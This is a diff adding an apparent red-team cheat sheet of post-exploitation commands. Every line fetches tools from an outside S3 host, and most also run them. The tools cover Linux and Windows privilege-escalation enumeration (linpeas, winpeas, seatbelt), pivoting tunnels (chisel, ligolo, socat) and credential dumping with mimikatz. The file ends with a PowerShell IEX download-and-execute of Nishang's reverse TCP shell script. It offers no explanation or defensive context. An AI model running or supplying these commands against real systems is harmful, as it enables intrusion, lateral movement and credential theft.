@@ -1,0 +1,58 @@
+==============================
+LINUX ENUMERATION
+==============================
+
+curl -O http://redteam-lab-payloads.s3.amazonaws.com/l/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+curl -O http://redteam-lab-payloads.s3.amazonaws.com/l/linenum.sh
+chmod +x linenum.sh
+./linenum.sh
+
+curl -O http://redteam-lab-payloads.s3.amazonaws.com/l/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+
+curl -O http://redteam-lab-payloads.s3.amazonaws.com/l/pspy64
+chmod +x pspy64
+./pspy64
+
+
+==============================
+PIVOTING
+==============================
+
+curl -O http://redteam-lab-payloads.s3.amazonaws.com/p/chisel
+chmod +x chisel
+
+curl -O http://redteam-lab-payloads.s3.amazonaws.com/p/ligolo-agent
+chmod +x ligolo-agent
+
+curl -O http://redteam-lab-payloads.s3.amazonaws.com/p/socat
+chmod +x socat
+
+
+==============================
+WINDOWS ENUMERATION
+==============================
+
+powershell iwr http://redteam-lab-payloads.s3.amazonaws.com/w/winpeas.exe -OutFile winpeas.exe
+
+powershell iwr http://redteam-lab-payloads.s3.amazonaws.com/w/seatbelt.exe -OutFile seatbelt.exe
+
+powershell iwr http://redteam-lab-payloads.s3.amazonaws.com/w/sharpup.exe -OutFile sharpup.exe
+
+
+==============================
+CREDENTIAL ACCESS
+==============================
+
+powershell iwr http://redteam-lab-payloads.s3.amazonaws.com/c/mimikatz.exe -OutFile mimikatz.exe
+
+
+==============================
+NISHANG
+==============================
+
+powershell IEX (New-Object Net.WebClient).DownloadString("http://redteam-lab-payloads.s3.amazonaws.com/tools/windows/nishang/Shells/Invoke-PowerShellTcp.ps1")
